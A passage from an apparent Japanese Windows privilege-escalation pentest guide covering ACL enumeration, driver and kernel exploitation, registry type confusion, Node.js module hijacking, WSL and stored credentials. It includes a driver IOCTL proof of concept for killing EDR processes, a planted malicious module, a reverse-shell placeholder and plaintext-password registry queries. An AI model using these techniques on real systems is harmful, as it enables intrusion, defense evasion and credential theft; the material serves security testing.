NTFS では、読み取り可能なファイルに名前付きの `:$DATA` ストリームが含まれていても、通常のディレクトリ一覧には表示されないことがあります。アクセス可能なバックアップや設定ファイルのうち、関連性の高い少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) および PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) で確認できます。秘密情報を示唆するストリーム名は、あくまで手がかりにすぎません。ファイルへの実効読み取りアクセス、ファイルシステムのストリーム対応、ストリームに利用可能な認証情報が含まれているか、またその認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の出力は避けてください。

## Scheduled Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、プロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動する scheduled task またはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスを、そのアカウントのコンテキストでのコマンド実行につなげられる可能性があります。ヘルパーが特権で実行されることと、サイドカーファイル**両方**を作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

Scheduled task では、そのアクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手がかりにすぎず、タスクがそこから入力を読み取る証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして privilege escalation できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した場合に、既存の書き込み保護されたファイルを実行していた古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている完全なパッチレベルと、該当する agent の操作を実行できるかを確認してください。`2.1` のようなブランチ名だけでは、影響の有無を判断できません。ファイルの作成や agent コマンドの実行を行わずに、バージョン、サービスの状態、Temp のアクセス権限を調査できます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、build 6210 以前の ADSelfService Plus に影響し、ベンダーは build 6211 で修正しました。この問題が関係するのは、SAML SSO が**有効である、または過去に有効だった**場合に限られます。したがって、インストール済み製品のエントリやサービスパスは手掛かりであり、脆弱性の確定ではありません。正確な build、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。このサービスを介したコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、SYSTEM アカウントで動作するインスタンスの場合に限られます。製品の Backup ディレクトリにある、読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権限を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows 上の Jenkins controller では、ジョブの作成・設定権限と、ジョブの起動権限を区別してください。[Jenkins ではこれらを個別の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド経路になることもありますが、それが有効であり、実際にビルドが実行されることを確認してください。実行時の ID は controller または選択された agent のものとなり、保存された認証情報を使用できるのは、ジョブがそのスコープにアクセスできる場合に限られます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを調査してください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)）。これらのファイルが存在するだけでは、パスワードが判明するわけではありません。共有出力に秘密情報を表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路を確認してください。そのアカウントに AD ユーザーオブジェクトの `scriptPath` 書き込み権限がある場合は、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオンまたはスケジュール済みの実行主体を確認してから、ユーザーをまたぐ実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を個別に検証する必要があります。

#### Azure Pipelines self-hosted agent の実行 ID

Azure DevOps Server または Azure Pipelines プロジェクトでは、パイプラインの**作成・編集**権限と、パイプラインの**キュー登録**および選択した agent pool の使用権限を区別してください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を別個に説明しています。権限の低いアカウントがスクリプトステップを送信し、そのパイプラインを self-hosted Windows agent 上で実行できる場合、そのステップは[agent に設定された OS アカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザーをまたぐ権限昇格や SYSTEM への移行を主張する前に、対象パイプライン、ブランチやリソースの制限、認可済み pool、実行可能なジョブ、agent サービスの実行 ID を確認してください。agent のインストール、プロジェクトのロール、リポジトリへの書き込み権限だけでは手掛かりにすぎません。パッシブな列挙では、ビルドを開始せずに権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL データベースにアクセスする **ADSync サービスアカウント**と、ディレクトリ権限が設定済みの同期機能によって異なる **AD DS connector アカウント**を区別しています。connector の認証情報はデータベース内に暗号化して保存され、鍵の素材は[ADSync サービスアカウントの DPAPI によって保護](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)されています。同期サービスがインストールされていること、ローカルの管理者を連想させるグループがあること、またはデータベースが見えることだけでは、復号可能な認証情報やドメイン権限昇格が立証されるわけではありません。実際のデータベース読み取り権限、サービスアカウントと鍵へのアクセス、インストール先と SQL の配置、設定済みの connector ID、その ID が持つ実効 AD 権限をそれぞれ確認してください。通常の列挙では、サービスとアクセスのメタデータのみを表示し、保存された秘密情報を照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL のアクセス権限

インストールされたプリンタードライバーは、`C:\ProgramData` 配下にサポート DLL を保存し、より高い権限を持つ印刷プロセスで読み込む場合があります。プリンターの WMI 列挙が拒否されても、親ディレクトリや reparse point を含め、対象のドライバーディレクトリと DLL の ACL を確認してください。[Ricoh プリンタードライバーの問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[当初の開示](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みについて説明されています。ACL が書き込み可能であることは手掛かりにすぎません。拒否エントリを考慮した実効書き込み権限、該当ドライバーがインストールされており、特権 ID でそのファイルを読み込むこと、ベンダーの更新済みドライバーやセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから、脆弱性があると判断しないでください。

### 書き込み権限

特別なファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントで実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム上の権限が弱いフォルダーやファイルを見つける方法は、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ pluginによる自動ロード永続化/実行

Notepad++は、`plugins` サブフォルダ内のプラグインDLLを自動ロードします。書き込み可能なポータブル版/コピー版が存在する場合、悪意のあるプラグインを配置すると、起動のたびに `notepad++.exe` 内で自動的にコードが実行されます（`DllMain` やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリ項目やバイナリを上書きできるか確認してください。**\
**次のページを読んで、権限昇格に利用できる興味深い** **自動起動の場所について詳しく学んでください**。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審/脆弱な**ドライバーがないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順については、こちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

関連する Windows kernel-exploitation の資料：

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition bug では、lookup を意図的に遅くする（最大長の component や深い directory chain を使う）ことで、数マイクロ秒の race window を数十マイクロ秒まで広げられます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug を組み合わせて構築できるものがあります。1つは queue lock を保持したまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済み paged-pool allocation の内容を漏らす **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploitation に関するメモ：

- **lock を保持したまま解放し、その後 cancel**：成功 path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。成功 path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 同じサイズの攻撃者制御 paged-pool allocation で、解放された queue object を **reclaim** します。`NPFS` Data Queue Entry は、payload とサイズを制御でき、後から pipe read/peek operation で調べられるため便利です。解放された object に list link が含まれている場合は、それを **user memory 内の fake request node の cyclic list** で上書きすると、ドライバーは元の list head で終了せず、攻撃者定義の request structure を繰り返し処理します。
- **予測可能な write を強化する**：fake request によって bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を変更できる場合、**書き込み先アドレスは制御できるが、値は制御できない** kernel write を得られる可能性があります。この場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、その後 spray を順に調べ、破損した object から **out-of-bounds paged-pool read** を実現します。
- **raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者がコピーされる buffer を拡大できると、信頼性が向上します（たとえば、多数の list/resource entry を追加して serializer の最終 allocation size を増やす）。これにより、必ずしもマシンをクラッシュさせることなく、コピーにかかる時間が長くなり、replacement window が広がります。
- **pointer-rich refill target**：Windows **I/O ring** の registered-buffer array は優れた disclosure target です。paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各要素が `_IOP_MC_BUFFER_ENTRY` への kernel pointer だからです。この array を1つ leak し、周囲の `IORING_OBJECT` を特定したら、**`RegBuffers`** と **`RegBuffersCount`** を破損させます。これにより、後続の I/O ring operation が攻撃者が偽造した entry を使用し、任意の kernel read/write が可能になります。利用できる write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14`）しか与えない場合は、**重複する非アライン write** を使って `0x0101010101010101` のような同じ byte の繰り返しによる user pointer を構築し、`VirtualAlloc` で map して、偽造した registered-buffer array をそこに配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive ワークフローで SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なメモリ配置を整え、書き込み可能な HKLM/HKU の子キーを悪用し、カスタムドライバーなしでメタデータ破損を kernel paged-pool overflow に変換できます。完全な攻撃チェーンはこちらをご覧ください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスを使った `RtlQueryRegistryValues` の direct-mode 型混同

一部のドライバーはユーザーランドからレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`int readValue` のようなスタック上のスカラーに `RTL_QUERY_REGISTRY_DIRECT` で値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが得られます。<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザーが制御する絶対パス `\Registry\...` を使うと、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログからキーの存在を漏らしたり、呼び出し元が直接アクセスできない値を読み取らせたりできる場合があります。
- **Kernel メモリ破損**: `&readValue` のようなスカラーの格納先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定のバイナリバッファとして型混同されます。

実践的な悪用に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive**を照会すると、kernel 呼び出し元は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。悪用可能性を維持するには、`HKCU` に値を用意するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive への値の配置**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した**低整合性**トークンでもスキャンを再実行して、sandbox 環境から到達可能なキーを見つけます。<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`に8-byteの直接書き込みを行うと、隣接するスタックデータが破損し、近くのcallback/function pointerが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指すことを想定しています。コードがまず攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込み、その後同じバッファを文字列の読み込みに再利用すると、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半ば制御されたkernel writeが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。以前の`REG_DWORD`読み込みによって、再利用されたスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。この方法は、callback-pointerを完全に上書きするうえで、最も簡潔な手段となることがよくあります。

有力な探索パターン: **初期化し直さずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みが行われるかどうかが決まるコードパスをgrepします。

#### デバイスオブジェクトでFILE_DEVICE_SECURE_OPENが欠落している状態の悪用（LPE + EDR kill）

一部の署名済みサードパーティ製ドライバーは、IoCreateDeviceSecureで強固なSDDLを指定してデバイスオブジェクトを作成するものの、DeviceCharacteristicsでFILE_DEVICE_SECURE_OPENを設定し忘れます。このフラグがないと、余分なコンポーネントを含むパスを通じてデバイスを開く際にセキュアDACLが適用されず、権限のないユーザーでも次のような名前空間パスを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例）

ユーザーがデバイスを開けると、そのドライバーが公開する特権IOCTLを悪用してLPEや改ざんを実行できます。実際に確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（オフライン改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、kernel経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLでアクセスを制限するデバイスオブジェクトを作成する際は、必ずFILE_DEVICE_SECURE_OPENを設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPLチェックを追加してください。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネルの特権を直接使う代わりにブローカー方式を検討してください。

防御側の検出案
- 不審なデバイス名（例: \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示唆する特定のIOCTLシーケンスを監視してください。
- Microsoftの脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも管理してください。


## PATH DLL Hijacking

**PATH上にあるフォルダー内への書き込み権限**があれば、プロセスが読み込むDLLをハイジャックし、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのアクセス許可を確認してください：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron モジュール解決の hijacking

これは、`require("foo")` のような bare import を実行した際に、想定されたモジュールが**見つからない**場合に **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダを確認してパッケージを解決します。Windows では、この探索がドライブのルートにまで到達するため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に探索する可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダ）を仕込み、**高権限の Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスク／サービスラッパーから実行されている場合、または特権を持つデスクトップアプリとして自動起動される場合、これは **LPE** につながります。

特に、次のようなケースでよく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- 本番ビルドからパッケージが削除された、パッケージング時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がアプリケーションのメインコードではなく、依存関係ツリーの深い場所にある

### 脆弱な対象の調査

**Procmon** を使用して解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルタリングする
- `Path` に `node_modules` が `contains` される条件でフィルタリングする
- `NAME NOT FOUND` と、`C:\node_modules` で最終的に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースコードで、次のコードレビュー上のパターンを探します。

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認により、**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、ルートの検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される名前と完全に一致するモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に欠落することのある optional module の例として `bluebird` や `utf-8-validate` があります。ただし、再利用可能な**手法**の本質は、特権で動作する Windows の Node/Electron プロセスが解決する、任意の**欠落した bare import**を見つけることです。

### 検知とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、その場所への新しい `.js` ファイル／パッケージの書き込みを検知する。
- `C:\node_modules\*` から読み取る、高い整合性レベルのプロセスを調査する。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査する。
- サードパーティ製コードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認する。
- ライブラリが対応している場合、optional probe を無効にする（たとえば、一部の `ws` のデプロイでは `WS_NO_UTF_8_VALIDATE=1` を設定して、旧式の `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts ファイル

hosts ファイルにハードコードされている、ほかの既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開放ポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるかどうかは、認証とコマンド制御の設定によります。より高い権限を持つアカウントで実行されているカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎません。認証が必要なメモリ破損経路を確認するには、そのバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合します。転送ルールがあるだけでは、転送先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARPテーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォール規則

[**ファイアウォール関連のコマンドはこちらを確認**](../basic-cmd-for-pentesters.md#firewall) **（規則の一覧表示、規則の作成、無効化、無効化など）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートでリッスンできます（初めて `nc.exe` でポートをリッスンするときは、ファイアウォールで `nc` を許可するかどうかを GUI で尋ねられます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash を root として簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` のファイルシステムを確認できます。

WSL 内の Linux `root` であるだけでは、Windows の Administrator 権限は得られません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるため、`/root/.bash_history` を含むシェル履歴ファイルを確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに適用されます。WSL 2 では、一般にディストリビューションが [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力するのは避けてください。

## Windows の資格情報

### Winlogon の資格情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値があれば、レジストリ内に平文パスワードが存在することを示す所見です。`AutoAdminLogon=1` であっても、読み取り可能な平文パスワードがない場合は、あくまで調査の手がかりに留まります。[Sysinternals Autologon はパスワードを LSA secret として保存する場合があります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の漏えいとして報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault には、**Windows** が**ユーザーを自動的にログインさせる**ために使用できる、サーバー、Webサイト、その他のプログラム用のユーザー認証情報が保存されます。一見すると、Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーで自動的にログインできるようにする機能のように思えるかもしれませんが、そうではありません。

Windows Vault には、Windows がユーザーを自動的にログインさせるための認証情報が保存されます。つまり、リソース（サーバーまたはWebサイト）にアクセスするために認証情報が必要な**Windows アプリケーションは、この Credential Manager と Windows Vault を利用**して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を利用することはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、既定のストレージ vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`runas` を `/savecred` オプション付きで使用できます。以下の例では、SMB share 経由でリモート binary を呼び出しています。

```bash
